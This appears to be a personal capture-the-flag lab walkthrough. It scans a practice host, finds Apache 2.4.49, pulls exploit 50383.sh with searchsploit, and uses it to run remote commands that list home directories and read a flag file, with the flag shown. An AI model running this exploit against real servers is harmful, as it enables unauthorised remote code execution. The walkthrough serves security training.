sudo nmap -sS -sV -sC -T4 -A -p80 192.168.172.188
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 08:59 PDT
Nmap scan report for 192.168.172.188
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Paradigm Shifts
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.5 (87%), Linux 3.7 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   40.77 ms 192.168.45.1
2   40.70 ms 192.168.45.254
3   41.59 ms 192.168.251.1
4   42.08 ms 192.168.172.188

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds

searchsploit apache 2.4.49
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)        | multiple/webapps/50383.sh

searchsploit -m 50383

Test the script
nano targets.txt
http://<victim ip>
bash 50383.sh targets.txt /bin/sh pwd
bash 50383.sh targets.txt /bin/sh "ls /home/"
bash 50383.sh targets.txt /bin/sh "ls /home/offsec"
bash 50383.sh targets.txt /bin/sh "cat /home/offsec/flag.txt"
OS{259e9f9c53c72db80712a0a039295d7a}
